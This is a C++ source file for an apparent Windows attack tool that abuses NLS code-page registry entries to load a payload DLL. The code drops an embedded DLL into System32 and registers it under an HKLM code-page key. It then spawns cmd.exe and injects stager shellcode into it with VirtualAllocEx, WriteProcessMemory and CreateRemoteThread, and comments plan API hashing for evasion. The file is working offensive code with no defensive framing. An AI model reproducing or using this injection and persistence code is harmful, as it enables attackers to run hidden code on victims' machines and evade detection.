#include "headers.hpp"
#include "payload.hpp"
#include "strsafe.h"
#include "payload.hpp"
#include "resource1.h"
#define MAX_SIZE_DATA 260

//Two functions required: One hex, and decimal.

//Decimal function (used for arg)
UINT StringToIntDecimal(PWCHAR str) noexcept
{
	uint32_t num = _wtoi(str);
	return num;
}
UINT StringToInt(PWCHAR str) noexcept {

	wchar_t chrSubkey, chr, * j;
	UINT i;
	j = str;
	chrSubkey = *str;
	for (i = 0; *j; chrSubkey = *j)
	{
		++j;
		if ((chrSubkey - 0x41) > 5u)
		{
			if ((chrSubkey - 0x30) > 9u)
			{
				if ((chrSubkey - 0x61) > 5u)
					return i;
				chr = chrSubkey - 87;
			}
			else
			{
				chr = chrSubkey - 0x30;
			}
		}
		else
		{
			chr = chrSubkey - 55;
		}
		i = chr + 16 * i;
	}
	return i;
}

BOOLEAN CompareLastElementString(PWCHAR str1, PWCHAR str2, BOOLEAN CaseInsensitive)
{
	bool bResult = false;
	//Has to find .dll somewhere, in the substring, otherwise doesnt exist.
	wchar_t* dll = wcsstr(str1, str2);
	if (dll != nullptr) {
		bResult = true;
	}
	return bResult;
}

bool FindCodePageWithPayload(PRegistryKey regObject, UINT dwValuesCount, UINT dwMaxLenValues){
	DWORD dwCountName = 0, typeData, ValueDataSize = 0;
	//uint32_t CodePageInt;
	WCHAR CodePageID[MAX_PATH], ValueData[MAX_SIZE_DATA];
	bool bResult = false;

	for (UINT i = 0; i < dwValuesCount; i++) {
		dwCountName = 260;  
		ValueDataSize = 260;
		LSTATUS status = RegEnumValueW(regObject->hSubkeyNls, i, CodePageID, &dwCountName, nullptr, &typeData, (BYTE*)&ValueData,
			&ValueDataSize);
		if (status != ERROR_SUCCESS && GetLastError() != ERROR_ALREADY_EXISTS)
		{
			std::wprintf(L"Could not query Code Page ID %s, Last error: [%x]\n", CodePageID, GetLastError());
			continue;
		}
#ifdef _DEBUG
		std::wprintf(L"Iterating: %d - %s = %s\n", i, CodePageID, ValueData);
#endif 
		if (typeData == REG_SZ && regObject->compareStringEqual(Index::DLL_NAME, ValueData)){
#ifdef _DEBUG
			std::wprintf(L"Payload value has been found!: %d - %s = %s\n", i, CodePageID, ValueData);
#endif
			regObject->setCodePageID(StringToInt(CodePageID), CodePageIDIndex::CodePageHex);
			regObject->setCodePageID(StringToIntDecimal(CodePageID), CodePageIDIndex::CodePageInt);
			bResult = true;
			break;
		}
	}
	return bResult;
}

bool IterateCodePageAndExtractProperId(PRegistryKey regObject) {
	DWORD dwMaxLenValues, dwCountName = 0, dwValuesCount, typeData, ValueDataSize = 0;
	uint32_t CodePageInt = NULL, posCount = NULL;
	bool correctRet = false;
	LSTATUS status;
	WCHAR CodePageID[MAX_PATH], ValueData[MAX_SIZE_DATA];

	//Queries information for the NLS subkey, mostly related to the values, which is the part that interests us the most.
	if (::RegQueryInfoKeyW(regObject->hSubkeyNls, nullptr, nullptr, nullptr,
		nullptr, nullptr, nullptr, &dwValuesCount, &dwMaxLenValues, nullptr, nullptr, nullptr))
	{
		std::cerr << "Could not query information for the key, last error is: " << GetLastError() << "\n";
		return correctRet;
	}
	//Only one failing, lets fix it.
	if (FindCodePageWithPayload(regObject, dwValuesCount, dwMaxLenValues)){
		correctRet = true;
		return correctRet;
	}
	//Find one with .dll, then from there increase one until it works out.
	for (UINT i = 0; i < dwValuesCount; i++) {
		dwCountName = 260;
		ValueDataSize = 260;
		status = RegEnumValueW(regObject->hSubkeyNls, i, CodePageID, &dwCountName, nullptr, &typeData, (BYTE*)&ValueData,
			&ValueDataSize);
		if ((status != EXIT_SUCCESS) && (GetLastError() != ERROR_ALREADY_EXISTS))
		{
			std::wprintf(L"Could not query Code Page ID %s, Last error: [%x]\n", CodePageID, status);
			continue;
		}
#ifdef _DEBUG
		std::wprintf(L"Querying value i: %d, %s = %s\n", i, CodePageID, ValueData);
#endif
		if (typeData == REG_SZ && CompareLastElementString(ValueData, const_cast<wchar_t*>(L".dll"), FALSE))
		{
#ifdef _DEBUG
			std::wprintf(L"Value with dll found in i = %d, %s = %s\n", i, CodePageID, ValueData);
			CodePageInt = StringToInt(CodePageID);
			std::wprintf(L"Code page as int is: %x\n", CodePageInt);
#endif // _DEBUG
			CodePageInt = StringToInt(CodePageID);
			posCount = i;
			break;
		}
	}
	if (CodePageInt == NULL) {
		std::printf("Could not find apropiate dll extension inside one of the subvalues\n");
		return correctRet;
	}
	//FIX THIS CODE, WHEN PRINTING THERE IS SOMETHING THAT GOES WRONG.
	CodePageInt += 1;
	for (UINT i = 0; i < dwValuesCount - posCount; i++) {
		//2.Then we proceed to check if the code page ID value exists, if it doesnt, we create it and set the data.
		if (SUCCEEDED(StringCchPrintfW(ValueData, MAX_SIZE_DATA, L"%04x", CodePageInt)))
		{
			std::printf("Trying to create in CodePage ID %x\n", CodePageInt);
		}
		status = RegQueryValueEx(regObject->hSubkeyNls, ValueData, NULL, NULL, NULL, NULL);
		if (status != ERROR_SUCCESS && status == ERROR_FILE_NOT_FOUND)
		{
			if (!RegSetValueExW(regObject->hSubkeyNls, ValueData, NULL, REG_SZ, (BYTE*)regObject->getStringBuffer(Index::DLL_NAME),
				regObject->getStringSize(Index::FULL_PAYLOAD_DLL_PATH)))
			{
				std::printf("Sucessfully created dll payload in CodePage ID %x\n", CodePageInt);
				regObject->setCodePageID(CodePageInt, CodePageIDIndex::CodePageHex);
				regObject->setCodePageID(StringToIntDecimal(ValueData), CodePageIDIndex::CodePageInt);
				correctRet = true;
				break;
			}
		}
		CodePageInt += 1;
	}
	return correctRet;
}

bool CreateProcessToInject(LPPROCESS_INFORMATION procInfo) {
	STARTUPINFOW infoProc;
	//PROCESS_INFORMATION processInfo;
	ZeroMemory(&infoProc, sizeof(infoProc));
	infoProc.cb = sizeof(infoProc);
	ZeroMemory(procInfo, sizeof(procInfo));
	wchar_t path[MAX_PATH];
	GetSystemDirectoryW(path, MAX_PATH);
	wcscat_s(path, MAX_PATH, L"\\cmd.exe");
	return CreateProcessW(NULL, path, NULL, NULL, false, CREATE_NEW_CONSOLE, NULL, NULL, &infoProc, procInfo) != NULL;
}

bool DropSystemDllPayload(PRegistryKey regObject) {
	HMODULE hMod = GetModuleHandleA(NULL);
	HRSRC hResource = FindResource(hMod, MAKEINTRESOURCE(IDR_RT_RCDATA1), L"RT_RCDATA");
	if (hResource == NULL)
	{
		printf("Could not find the payload dll resource, exiting...\n");
		return false;
	}
	DWORD dwSizeResource = SizeofResource(hMod, hResource);
	HGLOBAL hResLoaded = LoadResource(hMod, hResource);
	if (hResLoaded == NULL)
	{
		printf("Could not find the dll, exiting...\n");
		return false;
	}
	auto pBuffer = static_cast<BYTE*> (LockResource(hResLoaded));
	LPWSTR pathPayload = new wchar_t[MAX_PATH];
	GetSystemDirectoryW(pathPayload, MAX_PATH);
	wcscat_s(pathPayload, MAX_PATH, L"\\");
	wcscat_s(pathPayload, MAX_PATH, regObject->getStringBuffer(Index::DLL_NAME));
	regObject->setStringBuffer(pathPayload, Index::FULL_PAYLOAD_DLL_PATH);
	HANDLE hFile = CreateFileW(pathPayload, GENERIC_ALL, FILE_SHARE_DELETE,
		NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
	delete[] pathPayload;
	if (hFile == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_FILE_EXISTS){
			std::printf("File already exists, trying to set up registry.\n");
			return true;
		}
		std::printf("Could not obtain HANDLE to the newly created FILE, last error is %d\n", GetLastError());
		return false;
	}
	DWORD dwNumberBytesWritten;
	if (!WriteFile(hFile, pBuffer, dwSizeResource, &dwNumberBytesWritten, nullptr))
	{
		std::printf("Could not write to file, last error is %d\n", GetLastError());
		CloseHandle(hFile);
		return false;
	}
	CloseHandle(hFile);
	return true;
}

void SelfSpawnPayload(DWORD dwCodePageId)
{
	if (!GetConsoleWindow())
	{
		if (!AllocConsole()) {
			return;
		}
	}
	if (!SetConsoleOutputCP(dwCodePageId)) {
		std::printf("Could not self test injection in SetConsoleOutputCP, last error is: 0x%x\n", GetLastError());
		return;
	}
	if (!SetConsoleCP(dwCodePageId)) {
		std::printf("Could not self test for SetConsoleCp: Last error is 0x%x\n", GetLastError());
		return;
	}
	SetThreadUILanguage(0);
}

void InjectStagerToPayload(PRegistryKey regObject) {

	//Write argument in remote process space
	LPVOID lpCodePageID = (LPVOID)VirtualAllocEx(regObject->m_procInfo.hProcess, NULL, sizeof(DWORD), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpCodePageID == nullptr) {
		std::printf("Could not allocate buffer in remote process\n");
		return;
	}
	DWORD codePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
	if (!WriteProcessMemory(regObject->m_procInfo.hProcess, lpCodePageID, &codePageID, sizeof(DWORD), NULL)) {
		std::printf("Could not create write memory with codePageID to inject\n");
		return;
	}
	//Alloc and write shellcode, easiest way is VirtualAllocEx + WPM, but we have to pass arg, so I am not so sure how I am going to do that...
	LPVOID ShellcodeMemory = (LPVOID)VirtualAllocEx(regObject->m_procInfo.hProcess, NULL, lengthInject, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (ShellcodeMemory == nullptr) {
		std::printf("Could not allocate buffer in remote process\n");
		return;
	}
	//This will write the payload in the remote process.
	if (!WriteProcessMemory(regObject->m_procInfo.hProcess, ShellcodeMemory, &StubInject, lengthInject, NULL)) {
		std::printf("Could not create write memory with codePageID to inject\n");
		return;
	}
	//Need to change protection to EXECUTE_READ.
	DWORD dwProtection;
	if (!VirtualProtectEx(regObject->m_procInfo.hProcess, ShellcodeMemory, lengthInject, PAGE_EXECUTE_READ, &dwProtection)) {
		std::printf("Could not change protection of memory for shellcode injection. Last error is 0x%x\n", GetLastError());
		return;
	}
	HANDLE hThread = CreateRemoteThread(regObject->m_procInfo.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ShellcodeMemory, lpCodePageID, 0, nullptr);
	if (hThread == INVALID_HANDLE_VALUE) {
		std::printf("Could not open a handle to the payload .exe\n");
		return;
	}
	std::printf("Sucessfully injected to remote process, where shellcodeMemory is %p, and the codePageID is %d\n", ShellcodeMemory, codePageID);
}

//Main Bugs:
// 3. OPTIONAL: Convert every single of the function as part of regObject
//		-Implement Inheritance.
//		-Implement API Hashing and dynamic resolving. (NOT pic). Mathias from SC has something related to this in C++

bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept
{
	bool bResult = false; 
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regObject->getStringBuffer(Index::SUBKEY_KEY_VALUE),
		0, KEY_ALL_ACCESS, &regObject->hSubkeyNls) != EXIT_SUCCESS)
	{
		std::printf("Could not open handle to subkey of codePage!, LastError [0x%x]\n", GetLastError());
		return bResult;
	}
	if (!DropSystemDllPayload(regObject)) {
		std::printf("Payload dll has been failed to drop main payload \n");
		return bResult;
	}
	if (!IterateCodePageAndExtractProperId(regObject)){
		std::printf("Could not iterate key for proper modification. Last error: [0x%x]\n", GetLastError());
		return bResult;
	}
	//DWORD dwCodePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
	//SelfSpawnPayload(dwCodePageID);
	if (CreateProcessToInject(&regObject->m_procInfo))
	{
		InjectStagerToPayload(regObject);
	}

	return bResult;
}